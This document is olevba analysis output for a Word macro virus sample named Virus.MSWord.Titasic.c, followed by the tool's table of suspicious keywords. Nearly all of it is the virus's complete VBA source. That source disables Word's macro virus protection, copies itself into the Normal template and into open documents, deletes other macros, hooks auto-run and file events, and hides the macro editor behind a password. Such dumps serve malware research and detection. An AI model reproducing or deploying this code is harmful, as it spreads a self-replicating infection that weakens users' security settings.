olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Titasic.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Titasic.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AWNXHCK.bas 
in file: Virus.MSWord.Titasic.c - OLE stream: 'Macros/VBA/AWNXHCK'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub ShowMessage()
    H = Time
    If (WeekDay(Date) = vbMonday Or WeekDay(Date) = vbThursday) And Time < TimeValue("23:00:00") Then
        For i = 1 To 100
            Beep
        Next i
        Assistant.Visible = True
        With Assistant.NewBalloon
            .Icon = msoIconAlert
            .Text = "Terima kasih anda telah menggunakan program ini, jangan kapok OK!"
            .Heading = "Ucapan"
            .Show
        End With
    End If
    If (Month(Date) = vbOctober And Date = 8) Then
        For i = 1 To 100
            Beep
        Next i
        Assistant.Visible = True
        With Assistant.NewBalloon
             .Icon = msoIconAlert
             .Text = "Selamat Ulang Tahun..Yulianti, dari AwenX ybh"
             .Heading = "My heart just for you"
             .Show
        End With
    End If
End Sub

Sub Bablas()
    Options.SaveNormalPrompt = False
    Options.VirusProtection = False
    Options.SavePropertiesPrompt = False
End Sub

Sub ToolsMacro()
    H = MsgBox("Maaf !, anda tidak diberi hak untuk merubah atau membuat macro baru.", vbExclamation + vbOKOnly, "AwenX Alert")
End Sub

Sub ViewVbCode()
    ToolsMacro
End Sub

Sub FileTemplates()
    ToolsMacro
End Sub

Sub HelpAbout()
    H = MsgBox("Bismillahirrohmaanirrohiim." & Chr(13) & Chr(13) & _
    "Jangan Khawatir, macro ini tidak bersifat merusak data" & Chr(13) & _
    "bahkan macro ini melindungi data anda dari macro lain yang merusak" & Chr(13), vbOKOnly + vbExclamation, "A w e n X   E.  D r a j a t")
End Sub

Sub ToolsOptions()
    Options.SaveNormalPrompt = True
    Options.SavePropertiesPrompt = True
    Options.VirusProtection = True
    Dialogs(wdDialogToolsOptions).Show
    Bablas
End Sub

Sub ChangeCap()
    On Error Resume Next
    Application.Caption = "AwenX  macro diaktifkan "
    ActiveWindow.Caption = "AwenX - " + ActiveDocument.Name
End Sub

Sub RestoreCap()
    On Error Resume Next
    Application.Caption = "AwenX Word Processor"
    ActiveWindow.Caption = ActiveDocument.Name
End Sub

Sub OpenMyMacro()
    If InputBox("Enter password", "AwenX Macro") = "chaos" Then Application.ShowVisualBasicEditor = True
End Sub

Sub SikatDocument()
    Dim DocOk As Boolean
    DocOk = False
    For Each Obj In ActiveDocument.VBProject.VBComponents
        If Obj.Name = "AWNXHCK" Then DocOk = True
        If Obj.Name <> "AWNXHCK" And Obj.Name <> "ThisDocument" Then
            Application.StatusBar = "Deleting " + Obj.Name + _
            " Macro in " + ActiveDocument.Name + "..."
            Application.OrganizerDelete Source:=ActiveDocument.FullName, _
            Name:=Obj.Name, Object:=wdOrganizerObjectProjectItems
        End If
    Next Obj
    If DocOk = False Then
        Application.StatusBar = "Copying AwenX From Normal Template to " _
        + ActiveDocument.Name + "..."
        Application.OrganizerCopy Source:=NormalTemplate.FullName, _
        Destination:=ActiveDocument, Name:="AWNXHCK", Object:=wdOrganizerObjectProjectItems
    End If
End Sub

Sub SikatTemplate()
    Dim NorOk As Boolean
    NorOk = False
    For Each Obj In NormalTemplate.VBProject.VBComponents
        If Obj.Name = "AWNXHCK" Then NorOk = True
        If Obj.Name <> "AWNXHCK" And Obj.Name <> "ThisDocument" Then
            Application.StatusBar = "Deleting " + Obj.Name + _
            " Macro in Normal Template..."
            Application.OrganizerDelete Source:=NormalTemplate.FullName, _
            Name:=Obj.Name, Object:=wdOrganizerObjectProjectItems
        End If
    Next Obj
    If NorOk = False Then
        Application.StatusBar = "Copying AwenX Macro From " + ActiveDocument.Name + _
        " to Normal Template..."
        Application.OrganizerCopy Source:=ActiveDocument.FullName, _
        Destination:=NormalTemplate.FullName, Name:="AWNXHCK", Object:=wdOrganizerObjectProjectItems
        Application.DisplayRecentFiles = False
        Application.DisplayRecentFiles = True
    End If
End Sub

Sub AutoExit()
    ShowMessage
    Application.Quit
End Sub

Sub FileOpen()
    ChangeCap
    WordBasic.DisableAutoMacros True
    On Error Resume Next
    If Dialogs(wdDialogFileOpen).Show <> 0 Then
        SikatDocument
        ActiveDocument.Save
    End If
    RestoreCap
    WordBasic.DisableAutoMacros False
End Sub

Sub AutoOpen()
    Bablas
    ChangeCap
    SikatTemplate
    On Error Resume Next
    NormalTemplate.Save
    RestoreCap
End Sub

Sub AutoClose()
    SikatDocument
End Sub

Sub FileClose()
    AutoClose
End Sub

Sub FileSave()
    If ActiveDocument.Saved = False Then
        SikatDocument
        SikatTemplate
        On Error Resume Next
        ActiveDocument.Save
        ActiveDocument.Saved = True
    End If
End Sub

Sub Ancurin()
    C = Documents.Count
    If C <> 0 Then
        Normal.AWNXHCK.SikatDocument
        WordBasic.DisableAutoMacros False
        On Error Resume Next
        If ActiveDocument.Name <> "Document1" Then ActiveDocument.Save
    Else: Application.OnTime Now + TimeValue("00:00:07"), "Normal.AWNXHCK.Ancurin"
    End If
End Sub

Sub AutoExec()
    WordBasic.DisableAutoMacros True
    Bablas
    Application.OnTime Now + TimeValue("00:00:07"), "Normal.AWNXHCK.Ancurin"
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

